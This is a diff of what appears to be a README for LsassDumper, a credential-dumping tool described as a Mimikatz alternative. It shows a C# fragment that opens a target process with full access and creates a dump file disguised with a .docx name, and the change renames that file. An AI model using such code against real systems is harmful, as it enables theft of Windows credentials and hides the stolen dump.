@@ -9,7 +9,7 @@ The LsassDumper is a Mimikatz alternative tool used for credential dumping creat
 ```C#
  public static void RunMe(int procId)
         {
-            string dumpFileName = "C:\\Users\\Username\\Desktop\\dumpfile.docx";
+            string dumpFileName = "C:\\Users\\Username\\Desktop\\foo.docx";
             FileStream file = new FileStream(dumpFileName, FileMode.Create);
             IntPtr hProcess = OpenProcess((uint)0x001F0FFF, true, procId);
             bool res;
